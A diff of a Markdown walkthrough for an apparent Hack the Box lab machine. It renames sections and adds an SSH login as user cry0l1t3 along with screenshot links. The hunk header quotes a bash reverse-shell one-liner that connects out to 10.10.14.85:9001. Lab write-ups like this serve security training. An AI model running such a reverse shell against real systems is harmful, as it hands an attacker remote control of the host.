@@ -137,9 +137,12 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/881c6f7d-590c-4624-99dc-de223e6d9169)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4e8fcdc6-55e1-45f8-ae8f-8f76dd7ded72)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/973201b0-4f2b-42e8-95c5-af98ede1c6d2)
-# List of Users
+# Shell as cry0l1t3
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e746c9ba-ee46-43b2-8ee4-eab63a7e0f2e)
+# List of Users (Not Required)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bf5fe75b-fcff-4f91-bbf2-115df6a5d616)
-# SSH Brute-Force
+# SSH login as cry0l1t3
 ```CSS
-
+▶ ssh cry0l1t3@10.10.10.215
 ```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c873204a-0966-46ae-87ac-5b58310623d6)
